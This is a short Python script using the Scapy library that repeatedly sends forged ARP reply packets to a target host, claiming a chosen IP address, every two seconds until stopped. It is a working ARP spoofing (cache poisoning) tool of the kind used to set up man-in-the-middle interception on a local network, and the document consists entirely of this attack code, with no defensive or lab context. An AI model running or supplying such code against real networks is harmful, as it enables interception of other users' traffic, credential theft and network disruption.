#!/usr/bin/env python3

from scapy.all import *

target_ip = sys.argv[1]
spoof_ip = sys.argv[2]
spoof_mac = sys.argv[3]

try:
    pkgs = 0
    while True:
        packet = ARP(op = 2, pdst = target_ip, hwdst = spoof_mac, psrc = spoof_ip)
        send(packet, verbose = False)
        pkgs += 1
        print("Packets sent", pkgs)
        time.sleep(2)

except KeyboardInterrupt:
    print("\nCtrl + C pressed.............Exiting")

